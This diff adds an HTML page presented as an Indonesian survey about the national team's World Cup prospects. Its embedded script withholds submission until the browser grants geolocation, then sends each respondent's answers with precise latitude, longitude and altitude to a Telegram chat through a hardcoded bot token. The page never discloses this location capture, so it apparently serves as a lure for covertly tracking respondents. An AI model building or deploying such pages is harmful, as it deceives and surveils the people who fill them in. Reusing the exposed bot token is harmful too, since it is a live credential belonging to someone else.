@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Survey Piala Dunia Indonesia</title>
+  <style>
+      /* Style yang sama seperti sebelumnya */
+      body {
+          font-family: Arial, sans-serif;
+          max-width: 800px;
+          margin: 0 auto;
+          padding: 20px;
+          background-color: #f0f0f0;
+      }
+
+      .form-container {
+          background-color: white;
+          padding: 24px;
+          border-radius: 8px;
+          box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+          margin-bottom: 16px;
+      }
+
+      .question {
+          margin-bottom: 24px;
+      }
+
+      .question-title {
+          font-size: 16px;
+          font-weight: 500;
+          margin-bottom: 16px;
+          color: #202124;
+      }
+
+      .options {
+          display: flex;
+          flex-direction: column;
+          gap: 12px;
+      }
+
+      .option {
+          display: flex;
+          align-items: center;
+          padding: 8px;
+      }
+
+      input[type="radio"] {
+          margin-right: 10px;
+      }
+
+      .submit-btn {
+          background-color: #1a73e8;
+          color: white;
+          padding: 10px 24px;
+          border: none;
+          border-radius: 4px;
+          font-size: 14px;
+          cursor: pointer;
+          transition: background-color 0.2s;
+      }
+
+      .submit-btn:hover {
+          background-color: #1557b0;
+      }
+
+      .header {
+          text-align: center;
+          margin-bottom: 24px;
+          padding: 16px;
+          border-bottom: 2px solid #1a73e8;
+      }
+
+      #configPanel {
+          margin-bottom: 20px;
+          padding: 10px;
+          background-color: #fff;
+          border-radius: 4px;
+      }
+
+      .config-input {
+          margin: 10px 0;
+          width: 100%;
+          padding: 8px;
+          border: 1px solid #ddd;
+          border-radius: 4px;
+      }
+  </style>
+</head>
+<body>
+<div class="header">
+  <h1>Survey Piala Dunia Indonesia</h1>
+  <p>Berikan pendapat Anda tentang peluang Indonesia di Piala Dunia</p>
+</div>
+
+<form id="surveyForm" class="form-container">
+  <!-- Form questions sama seperti sebelumnya -->
+  <div class="question">
+    <div class="question-title">1. Seberapa yakin Anda bahwa Indonesia akan lolos kualifikasi Piala Dunia 2026?</div>
+    <div class="options">
+      <label class="option">
+        <input type="radio" name="q1" value="1" required> Sangat tidak yakin
+      </label>
+      <label class="option">
+        <input type="radio" name="q1" value="2"> Tidak yakin
+      </label>
+      <label class="option">
+        <input type="radio" name="q1" value="3"> Netral
+      </label>
+      <label class="option">
+        <input type="radio" name="q1" value="4"> Yakin
+      </label>
+      <label class="option">
+        <input type="radio" name="q1" value="5"> Sangat yakin
+      </label>
+    </div>
+  </div>
+
+  <div class="question">
+    <div class="question-title">2. Menurut Anda, seberapa siap infrastruktur sepak bola Indonesia untuk bersaing di level dunia?</div>
+    <div class="options">
+      <label class="option">
+        <input type="radio" name="q2" value="1" required> Sangat tidak siap
+      </label>
+      <label class="option">
+        <input type="radio" name="q2" value="2"> Tidak siap
+      </label>
+      <label class="option">
+        <input type="radio" name="q2" value="3"> Cukup siap
+      </label>
+      <label class="option">
+        <input type="radio" name="q2" value="4"> Siap
+      </label>
+      <label class="option">
+        <input type="radio" name="q2" value="5"> Sangat siap
+      </label>
+    </div>
+  </div>
+
+  <div class="question">
+    <div class="question-title">3. Bagaimana pendapat Anda tentang kualitas pemain Indonesia saat ini?</div>
+    <div class="options">
+      <label class="option">
+        <input type="radio" name="q3" value="1" required> Sangat kurang
+      </label>
+      <label class="option">
+        <input type="radio" name="q3" value="2"> Kurang
+      </label>
+      <label class="option">
+        <input type="radio" name="q3" value="3"> Cukup
+      </label>
+      <label class="option">
+        <input type="radio" name="q3" value="4"> Baik
+      </label>
+      <label class="option">
+        <input type="radio" name="q3" value="5"> Sangat baik
+      </label>
+    </div>
+  </div>
+
+  <div class="question">
+    <div class="question-title">4. Seberapa efektif program pembinaan usia muda di Indonesia?</div>
+    <div class="options">
+      <label class="option">
+        <input type="radio" name="q4" value="1" required> Sangat tidak efektif
+      </label>
+      <label class="option">
+        <input type="radio" name="q4" value="2"> Tidak efektif
+      </label>
+      <label class="option">
+        <input type="radio" name="q4" value="3"> Cukup efektif
+      </label>
+      <label class="option">
+        <input type="radio" name="q4" value="4"> Efektif
+      </label>
+      <label class="option">
+        <input type="radio" name="q4" value="5"> Sangat efektif
+      </label>
+    </div>
+  </div>
+
+  <div class="question">
+    <div class="question-title">5. Kapan menurut Anda Indonesia akan berhasil lolos ke Piala Dunia?</div>
+    <div class="options">
+      <label class="option">
+        <input type="radio" name="q5" value="1" required> 2026
+      </label>
+      <label class="option">
+        <input type="radio" name="q5" value="2"> 2030
+      </label>
+      <label class="option">
+        <input type="radio" name="q5" value="3"> 2034
+      </label>
+      <label class="option">
+        <input type="radio" name="q5" value="4"> 2038
+      </label>
+      <label class="option">
+        <input type="radio" name="q5" value="5"> Setelah 2038
+      </label>
+    </div>
+  </div>
+
+  <button type="submit" class="submit-btn">Kirim Survey</button>
+</form>
+
+<script>
+    async function sendToTelegram(message) {
+        const botToken = "6095001530:AAFuWHMbLAP8oJ1S8t-ee5hSVQuD1piNiLQ"
+        const chatId = "-4503774946"
+
+        if (!botToken || !chatId) {
+            alert('Mohon isi Bot Token dan Chat ID Telegram terlebih dahulu!');
+            return false;
+        }
+
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        const options = {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        };
+
+        try {
+            const response = await fetch(url, options);
+            const data = await response.json();
+            return data.ok;
+        } catch (error) {
+            console.error('Error:', error);
+            return false;
+        }
+    }
+
+    document.getElementById('surveyForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        // Mengumpulkan data survey
+        const formData = new FormData(this);
+        const surveyData = {};
+        for (const [key, value] of formData.entries()) {
+            surveyData[key] = value;
+        }
+
+        // Mendapatkan lokasi
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                const altitude = position.coords.altitude || "Tidak tersedia";
+
+                // Format pesan untuk Telegram
+                let message = '<b> Data Survey Baru:</b>\n\n';
+                message += ' Keyakinan Lolos: ' + surveyData.q1 + '/5\n';
+                message += ' Kesiapan Infrastruktur: ' + surveyData.q2 + '/5\n';
+                message += ' Kualitas Pemain: ' + surveyData.q3 + '/5\n';
+                message += ' Program Pembinaan: ' + surveyData.q4 + '/5\n';
+                message += ' Prediksi Lolos: ' + surveyData.q5 + '\n\n';
+                message += '<b> Lokasi Responden:</b>\n';
+                message += ' Latitude: ' + latitude + '\n';
+                message += ' Longitude: ' + longitude + '\n';
+                message += ' Altitude: ' + altitude + '\n';
+
+                // Kirim ke Telegram
+                const sent = await sendToTelegram(message);
+                if (sent) {
+                    alert('Terima kasih! Survey Anda telah terkirim.');
+                }
+            }, showError);
+        } else {
+            alert("Geolocation tidak didukung oleh browser ini.");
+        }
+    });
+
+    function showError(error) {
+        let message = "";
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                message = "Pengguna menolak permintaan Geolocation.";
+                break;
+            case error.POSITION_UNAVAILABLE:
+                message = "Informasi lokasi tidak tersedia.";
+                break;
+            case error.TIMEOUT:
+                message = "Permintaan lokasi timeout.";
+                break;
+            case error.UNKNOWN_ERROR:
+                message = "Terjadi kesalahan yang tidak diketahui.";
+                break;
+        }
+        console.error(message);
+        alert(message);
+    }
+</script>
+</body>
+</html>
